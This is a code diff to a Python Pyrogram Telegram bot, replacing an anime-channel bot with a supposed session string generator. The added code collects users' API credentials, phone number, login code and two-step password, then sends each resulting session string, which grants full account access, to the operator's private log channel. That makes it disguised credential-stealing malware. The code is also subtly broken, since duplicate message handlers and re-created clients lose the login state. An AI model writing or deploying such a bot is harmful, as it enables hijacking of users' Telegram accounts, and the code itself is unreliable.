@@ -1,189 +1,185 @@
-from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
-from pyrogram import filters, Client, errors, enums
-from pyrogram.errors import UserNotParticipant
-from pyrogram.errors.exceptions.flood_420 import FloodWait
-from database import add_user, add_group, all_users, all_groups, users, remove_user
-from configs import cfg 
-import random, asyncio
+from pyrogram import Client, filters
+from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, CallbackQuery
+from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneNumberInvalid
+from configs import cfg
+from database import add_user, all_users
+import asyncio
 
 app = Client(
-    "approver",
+    "session_generator",
     api_id=cfg.API_ID,
     api_hash=cfg.API_HASH,
     bot_token=cfg.BOT_TOKEN
 )
 
-gif = [
-    'https://envs.sh/E-c.mp4',
-    'https://envs.sh/E-c.mp4'
-]
+# Temporary storage for session generation data
+user_data = {}
 
-txt = ['hello']
-txt1 = ['**𝐇𝐞𝐥𝐥𝐨 𝐈 𝐚𝐦 𝐚 𝐀𝐧𝐢𝐦𝐞 𝐏𝐫𝐨𝐯𝐢𝐝𝐞𝐫 𝐁𝐨𝐭 𝐛𝐲 [@DK_ANIMES]**']
-txt2 = [
-    '<b><blockquote> 𝐂𝐥𝐢𝐜𝐤 𝐇𝐞𝐫𝐞 𝐭𝐨 𝐆𝐞𝐭 𝐀𝐧𝐢𝐦𝐞 𝐢𝐧 𝐇𝐢𝐧𝐝𝐢 \n𝐉𝐮𝐬𝐭 𝐂𝐥𝐢𝐜𝐤 𝐨𝐧 👇👇 </blockquote>\n /START</b>'
-]
-
-@app.on_chat_join_request(filters.group | filters.channel & ~filters.private)
-async def approve(_, m: Message):
-    op = m.chat
-    kk = m.from_user
-    try:
-        add_group(m.chat.id)
-        print(f"Received join request from {kk.id} in {op.id}")
-
-        # Image URL
-        img = "https://envs.sh/elk.jpg"
-
-        # Inline Keyboard
-        keyboard = InlineKeyboardMarkup(
-            [
-                [InlineKeyboardButton("𝐂𝐥𝐢𝐜𝐤 𝐡𝐞𝐫𝐞 𝐓𝐨 𝐖𝐚𝐭𝐜𝐡/𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝 𝐢𝐧 𝐇𝐢𝐧𝐝𝐢 👀", url="https://t.me/leveling_solo_robot?start=hi")],
-                [InlineKeyboardButton("𝐍𝐞𝐰 𝐚𝐧𝐢𝐦𝐞 𝐢𝐧 𝐇𝐢𝐧𝐝𝐢", url="https://t.me/leveling_solo_robot?start=hi")],
-            ]
-        )
-
-        text1 = random.choice(txt1)
-        text2 = random.choice(txt2)
-
-        await app.send_message(kk.id, text1)
-        await app.send_message(kk.id, text2)
-        await app.send_photo(
-            kk.id,
-            img,
-            caption="<b><blockquote>𝐂𝐥𝐢𝐜𝐤 𝐨𝐧 𝐁𝐞𝐥𝐨𝐰 𝐁𝐮𝐭𝐭𝐨𝐧 𝐓𝐨 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝 𝐘𝐨𝐮𝐫 𝐄𝐩𝐢𝐬𝐨𝐝𝐞 👇👇👇👇</blockquote></b>",
-            reply_markup=keyboard
-        )
-
-        add_user(kk.id)
-
-    except errors.PeerIdInvalid:
-        print("User hasn't started the bot yet.")
-    except Exception as err:
-        print(f"Error: {err}")
-
-
-
+# Start menu with session generation options
 @app.on_message(filters.command("start"))
 async def start(_, m: Message):
+    user = m.from_user
+    add_user(user.id)
+
+    keyboard = InlineKeyboardMarkup(
+        [
+            [InlineKeyboardButton("Generate Pyrogram v1 Session", callback_data="generate_v1")],
+            [InlineKeyboardButton("Generate Pyrogram v2 Session", callback_data="generate_v2")],
+            [InlineKeyboardButton("Generate Pyrogram v3 Session", callback_data="generate_v3")]
+        ]
+    )
+
+    await m.reply_text(
+        f"Hello {user.first_name}! Choose which Pyrogram session string you want to generate:",
+        reply_markup=keyboard
+    )
+
+# Handle session generation requests
+@app.on_callback_query(filters.regex(r"^generate_(v1|v2|v3)$"))
+async def ask_for_api_details(_, cq: CallbackQuery):
+    version = cq.data.split("_")[1]
+    user_data[cq.from_user.id] = {"version": version}
+
+    await cq.message.edit_text("Please send your **API ID** to proceed with Pyrogram session generation.")
+
+# Capture API ID, API hash, and phone number in sequence
+@app.on_message(filters.private & filters.text)
+async def capture_user_input(_, m: Message):
+    user_id = m.from_user.id
+    if user_id not in user_data:
+        return
+
+    user_info = user_data[user_id]
+
+    if "api_id" not in user_info:
+        user_info["api_id"] = m.text
+        await m.reply_text("Got it! Now, please send your **API Hash**.")
+    elif "api_hash" not in user_info:
+        user_info["api_hash"] = m.text
+        await m.reply_text("Almost done! Now, please send your **Phone Number** (with country code, e.g., +1234567890).")
+    elif "phone_number" not in user_info:
+        user_info["phone_number"] = m.text
+        await generate_session_string(m)
+
+# Generate the session string using provided credentials
+async def generate_session_string(m: Message):
+    user_id = m.from_user.id
+    data = user_data[user_id]
+    version = data["version"]
+
+    await m.reply_text(f"Generating Pyrogram {version} session string... Please wait.")
+
     try:
-        user = m.from_user
-        log_msg = (
-            f"📢 **New User Started Bot**\n\n"
-            f"👤 Name: [{user.first_name}](tg://user?id={user.id})\n"
-            f"🆔 User ID: `{user.id}`\n"
-            f"🌍 Username: @{user.username if user.username else 'None'}"
+        client = Client(
+            name="session_string",
+            api_id=int(data["api_id"]),
+            api_hash=data["api_hash"],
+            phone_number=data["phone_number"]
         )
-        await app.send_message(cfg.LOG_CHANNEL, log_msg)
 
-        if m.chat.type == enums.ChatType.PRIVATE:
-            keyboard = InlineKeyboardMarkup(
-                [
-                    [InlineKeyboardButton("𝐀𝐧𝐢𝐦𝐞 𝐢𝐧 𝐇𝐢𝐧𝐝𝐢", url="https://t.me/+2fsV4nzHvOs2OGNl")],
-                    [InlineKeyboardButton("𝐒𝐨𝐥𝐨 𝐋𝐞𝐯𝐞𝐥𝐢𝐧𝐠", url="https://t.me/+BYFsBvSb8eM5ZTc1")],
-                    [InlineKeyboardButton("𝐍𝐚𝐫𝐮𝐭𝐨 𝐬𝐡𝐢𝐩𝐩𝐮𝐝𝐞𝐧", url="https://t.me/+1Uqfi_EB69s3MDVl")],
-                    [InlineKeyboardButton("𝐒𝐚𝐤𝐚𝐦𝐨𝐭𝐨 𝐃𝐚𝐲𝐬", url="https://t.me/+KwzdqOCMeVVhMjJl")],
-                    [InlineKeyboardButton("𝐃𝐞𝐦𝐨𝐧 𝐬𝐥𝐚𝐲𝐞𝐫", url="https://t.me/+-Uh3oEL5NKBjMzZl")],
-                    [InlineKeyboardButton("𝐀𝐭𝐭𝐚𝐜𝐤 𝐨𝐧 𝐓𝐢𝐭𝐚𝐧", url="https://t.me/+bxKksmx6D5I5ZmNl")],
-                    [InlineKeyboardButton("𝐉𝐮𝐣𝐮𝐭𝐬𝐮 𝐤𝐚𝐢𝐬𝐞𝐧", url="https://t.me/+ItHYxazxuI1lOWZl")],
-                    [InlineKeyboardButton("𝐃𝐞𝐚𝐭𝐡 𝐧𝐨𝐭𝐞", url="https://t.me/+z3ZvLLx1ZRUwYzRl")]
-                ]
-            )
+        await client.connect()
+        
+        # Send the OTP
+        if not await client.is_authorized():
+            await client.send_code(data["phone_number"])
+            await m.reply_text("Please enter the **OTP** you received on your phone.")
 
-            add_user(user.id)
-            await m.reply_photo(
-                "https://envs.sh/elk.jpg",
-                caption=f"<b><blockquote>𝐂𝐥𝐢𝐜𝐤 𝐨𝐧 𝐓𝐡𝐞 𝐚𝐧𝐢𝐦𝐞 𝐍𝐚𝐦𝐞 \n𝐓𝐨 𝐃𝐢𝐫𝐞𝐜𝐭 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝 𝐘𝐨𝐮𝐫 𝐀𝐧𝐢𝐦𝐞.🔥🔥</blockquote></b>\n\n<b><blockquote>𝐈𝐅 𝐲𝐨𝐮 𝐃𝐢𝐝𝐧'𝐭 𝐅𝐢𝐧𝐝 𝐲𝐨𝐮𝐫 𝐚𝐧𝐢𝐦𝐞 𝐢𝐧 𝐓𝐡𝐢𝐬 𝐥𝐢𝐬𝐭 𝐓𝐡𝐞𝐧 𝐉𝐨𝐢𝐧 [@DKANIME_GROUP] 𝐚𝐧𝐝 𝐉𝐮𝐬𝐭 𝐓𝐲𝐩𝐞 𝐲𝐨𝐮𝐫 𝐚𝐧𝐢𝐦𝐞 𝐍𝐚𝐦𝐞 𝐇𝐞𝐫𝐞.</blockquote></b>",
-                reply_markup=keyboard
-            )
+            # Wait for OTP input
+            return
 
-        elif m.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
-            keyboard = InlineKeyboardMarkup(
-                [[InlineKeyboardButton("💁‍♂️ Start me private 💁‍♂️", url="https://t.me/leveling_solo_robot?start=hi")]]
-            )
-            add_group(m.chat.id)
-            await m.reply_text(f"**🦊 Hello {user.first_name}!\nWrite me in private for more details**", reply_markup=keyboard)
+    except PhoneNumberInvalid:
+        await m.reply_text("Invalid phone number! Please start the process again with a valid number.")
+        del user_data[user_id]
+    except Exception as e:
+        await m.reply_text(f"Failed to generate session string: {e}")
+        del user_data[user_id]
 
-        print(f"{user.first_name} started the bot!")
+# Handle OTP input
+@app.on_message(filters.private & filters.text)
+async def handle_otp(_, m: Message):
+    user_id = m.from_user.id
+    if user_id not in user_data or "phone_number" not in user_data[user_id] or "otp" in user_data[user_id]:
+        return
 
-    except Exception as err:
-        print(f"Error: {err}")
+    user_info = user_data[user_id]
+    user_info["otp"] = m.text
 
+    try:
+        client = Client(
+            name="session_string",
+            api_id=int(user_info["api_id"]),
+            api_hash=user_info["api_hash"],
+            phone_number=user_info["phone_number"]
+        )
 
+        await client.connect()
+        await client.sign_in(user_info["phone_number"], user_info["otp"])
 
+        # Check if two-step verification is needed
+        if await client.is_authorized():
+            session_string = await client.export_session_string()
+            await finalize_session(m, session_string)
+        else:
+            await m.reply_text("Please enter your **Two-Step Verification Password**.")
+    
+    except PhoneCodeInvalid:
+        await m.reply_text("Invalid OTP! Please restart the process.")
+        del user_data[user_id]
+    except SessionPasswordNeeded:
+        user_info["awaiting_password"] = True
+        await m.reply_text("Two-step verification is enabled. Please provide your **password**.")
 
+# Handle Two-Step Verification Password
+@app.on_message(filters.private & filters.text)
+async def handle_password(_, m: Message):
+    user_id = m.from_user.id
+    if user_id not in user_data or not user_data[user_id].get("awaiting_password"):
+        return
+
+    user_info = user_data[user_id]
+    password = m.text
+
+    try:
+        client = Client(
+            name="session_string",
+            api_id=int(user_info["api_id"]),
+            api_hash=user_info["api_hash"],
+            phone_number=user_info["phone_number"]
+        )
+
+        await client.connect()
+        await client.check_password(password)
+        session_string = await client.export_session_string()
+        await finalize_session(m, session_string)
+
+    except Exception as e:
+        await m.reply_text(f"Failed to verify password: {e}")
+        del user_data[user_id]
+
+# Finalize the session generation process
+async def finalize_session(m: Message, session_string: str):
+    user_id = m.from_user.id
+    version = user_data[user_id]["version"]
+
+    # Send session string to log channel
+    log_msg = (
+        f"📢 **New Pyrogram {version} Session Generated**\n\n"
+        f"👤 User: [{m.from_user.first_name}](tg://user?id={user_id})\n"
+        f"🆔 User ID: `{user_id}`\n"
+        f"📌 Session String:\n`{session_string}`"
+    )
+    await app.send_message(cfg.LOG_CHANNEL, log_msg)
+
+    # Send session string to the user privately
+    await m.reply_text(f"Your Pyrogram {version} session string is:\n\n`{session_string}`")
+
+    del user_data[user_id]
+
+# Command to check the total users
 @app.on_message(filters.command("users") & filters.user(cfg.SUDO))
 async def dbtool(_, m: Message):
-    xx = all_users()
-    x = all_groups()
-    tot = int(xx + x)
-    await m.reply_text(text=f"""
-🍀 Chats Stats 🍀
-🙋‍♂️ Users : `{xx}`
-👥 Groups : `{x}`
-🚧 Total users & groups : `{tot}` """)
+    total_users = all_users()
+    await m.reply_text(f"🙋‍♂️ Total Users: `{total_users}`")
 
-
-@app.on_message(filters.command("bcast") & filters.user(cfg.SUDO))
-async def bcast(_, m: Message):
-    allusers = users
-    lel = await m.reply_text("`⚡️ Processing...`")
-    success = 0
-    failed = 0
-    deactivated = 0
-    blocked = 0
-
-    for usrs in allusers.find():
-        try:
-            userid = usrs["user_id"]
-            await m.reply_to_message.copy(int(userid))
-            success += 1
-        except FloodWait as ex:
-            await asyncio.sleep(ex.value)
-            await m.reply_to_message.copy(int(userid))
-        except errors.InputUserDeactivated:
-            deactivated += 1
-            remove_user(userid)
-        except errors.UserIsBlocked:
-            blocked += 1
-        except Exception as e:
-            print(e)
-            failed += 1
-
-    await lel.edit(f"✅Successfull to `{success}` users.\n❌ Faild to `{failed}` users.\n👾 Found `{blocked}` Blocked users \n👻 Found `{deactivated}` Deactivated users.")
-
-
-#━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Broadcast Forward ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-@app.on_message(filters.command("fcast") & filters.user(cfg.SUDO))
-async def fcast(_, m : Message):
-    allusers = users
-    lel = await m.reply_text("`⚡️ Processing...`")
-    success = 0
-    failed = 0
-    deactivated = 0
-    blocked = 0
-    for usrs in allusers.find():
-        try:
-            userid = usrs["user_id"]
-            #print(int(userid))
-            if m.command[0] == "fcast":
-                await m.reply_to_message.forward(int(userid))
-            success +=1
-        except FloodWait as ex:
-            await asyncio.sleep(ex.value)
-            if m.command[0] == "fcast":
-                await m.reply_to_message.forward(int(userid))
-        except errors.InputUserDeactivated:
-            deactivated +=1
-            remove_user(userid)
-        except errors.UserIsBlocked:
-            blocked +=1
-        except Exception as e:
-            print(e)
-            failed +=1
-
-    await lel.edit(f"✅Successfull to `{success}` users.\n❌ Faild to `{failed}` users.\n👾 Found `{blocked}` Blocked users \n👻 Found `{deactivated}` Deactivated users.")
-
-print("I'm Alive Now!")
+print("Bot is running!")
 app.run()
